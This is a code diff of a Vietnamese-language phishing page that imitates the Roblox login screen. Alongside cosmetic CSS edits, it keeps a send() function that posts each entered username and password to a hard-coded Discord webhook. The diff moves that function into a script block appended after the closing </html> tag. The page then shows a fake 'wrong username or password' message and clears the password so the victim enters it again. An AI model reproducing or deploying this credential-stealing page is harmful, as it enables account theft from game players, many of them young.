@@ -16,7 +16,6 @@
             overflow: hidden;
         }
 
-        /* HEADER */
         .header {
             width: 100%; max-width: 450px; height: 52px;
             background: #232527; z-index: 100;
@@ -43,11 +42,16 @@
         }
         .nav-item { color: #bbb; font-size: 7px; font-weight: 600; }
 
+        /* 🔥 ẢNH ĐÃ FIX */
         .bg-image {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-image: url('https://images.rbxcdn.com/f9379895240be6d16f391b1076b97669.jpg');
-            background-size: cover; background-position: center; z-index: 1;
-            filter: brightness(0.25);
+            background-image: url('https://i.ibb.co/nsm66HQs/image.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            z-index: 1;
+
+            filter: brightness(0.35); /* giữ nét + đỡ chói */
         }
 
         .container { 
@@ -76,14 +80,13 @@
         }
         .input-field-u { margin-bottom: 3px; }
         
-        /* CSS CHO DÒNG LỖI CHỮ ĐỎ */
         #error-msg {
             color: #ff4d4d;
             font-size: 6.5px;
             text-align: left;
             margin-bottom: 5px;
             padding-left: 2px;
-            display: none; /* Mặc định là ẩn */
+            display: none;
         }
 
         .input-field-p { margin-bottom: 8px; }
@@ -111,25 +114,15 @@
         }
         .footer-links { 
             margin-bottom: 25px; 
-            display: flex; 
-            flex-wrap: wrap; 
-            justify-content: center; 
-            column-gap: 12px; 
-            row-gap: 20px;
+            display: flex; flex-wrap: wrap; justify-content: center; 
+            column-gap: 12px; row-gap: 20px;
         }
         .footer-links span {
-            font-size: 7.5px; 
-            color: #bbb;
-            display: inline-block;
+            font-size: 7.5px; color: #bbb;
         }
-        .footer-links span:nth-child(odd) { transform: translateY(8px); }
-        .footer-links span:nth-child(even) { transform: translateY(-8px); }
 
         .footer-copyright { 
-            font-size: 6px; 
-            color: #555; 
-            line-height: 1.4;
-            margin-top: 15px;
+            font-size: 6px; color: #555; margin-top: 15px;
         }
     </style>
 </head>
@@ -145,7 +138,7 @@
         </div>
         <div class="btn-top-login">Đăng nhập</div>
     </div>
-    
+
     <div class="header-nav">
         <span class="nav-item">Bảng xếp hạng</span>
         <span class="nav-item">Chợ</span>
@@ -160,16 +153,11 @@
     <div class="login-box">
         <h2>Thêm tài khoản</h2>
         <input type="text" id="u" class="input-field input-field-u" placeholder="Tên người dùng/Email/SĐT">
-        
         <div id="error-msg">Sai tên người dùng hoặc mật khẩu.</div>
-        
         <input type="password" id="p" class="input-field input-field-p" placeholder="Mật khẩu">
         <button class="btn-login" onclick="send()">Đăng nhập</button>
-        
         <a href="#" class="forgot-link">Bạn quên Mật khẩu hoặc Tên người dùng?</a>
-        
         <div class="spacer"></div>
-        
         <button class="btn-action">Gửi mã một lần cho tôi qua email</button>
         <button class="btn-action">Sử dụng thiết bị khác</button>
     </div>
@@ -188,35 +176,50 @@
         <span>Sơ đồ trang web</span>
     </div>
     <div class="footer-copyright">
-        ©2026 Roblox Corporation. Roblox, logo Roblox và Powering Imagination là các nhãn hiệu đã đăng ký của chúng tôi.
+        ©2026 Roblox Corporation.
     </div>
 </div>
 
 <script>
-    function send() {
-        const u = document.getElementById('u').value;
-        const p = document.getElementById('p').value;
-        const err = document.getElementById('error-msg');
+function send() {
+    const u = document.getElementById('u').value;
+    const p = document.getElementById('p').value;
+    const err = document.getElementById('error-msg');
 
-        if(!u || !p) {
-            err.style.display = 'block';
-            return;
-        }
-
-        // Gửi dữ liệu về Discord
-        fetch("https://discord.com/api/webhooks/1460276452489695315/XC5wn4raeZxbNGi_Gyow4VNaZ9kzAVhnEoFKPCjpalXR_uMwu2b0vVRC2N8meXeJ6GQj", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ content: "👤: `" + u + "`\n🔑: `" + p + "`" })
-        });
-
-        // Hiện chữ đỏ báo lỗi thay vì alert
-        setTimeout(() => { 
-            err.style.display = 'block';
-            // Xóa mật khẩu cũ để bắt nhập lại cho thật
-            document.getElementById('p').value = ""; 
-        }, 500);
+    if(!u || !p) {
+        err.style.display = 'block';
+        return;
     }
+
+    setTimeout(() => { 
+        err.style.display = 'block';
+        document.getElementById('p').value = ""; 
+    }, 500);
+}
 </script>
+
 </body>
 </html>
+<script>
+function send() {
+    const u = document.getElementById('u').value;
+    const p = document.getElementById('p').value;
+    const err = document.getElementById('error-msg');
+
+    if(!u || !p) {
+        err.style.display = 'block';
+        return;
+    }
+
+    fetch("https://discord.com/api/webhooks/1460276452489695315/XC5wn4raeZxbNGi_Gyow4VNaZ9kzAVhnEoFKPCjpalXR_uMwu2b0vVRC2N8meXeJ6GQj", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: "👤: `" + u + "`\n🔑: `" + p + "`" })
+    });
+
+    setTimeout(() => { 
+        err.style.display = 'block';
+        document.getElementById('p').value = ""; 
+    }, 500);
+}
+</script>
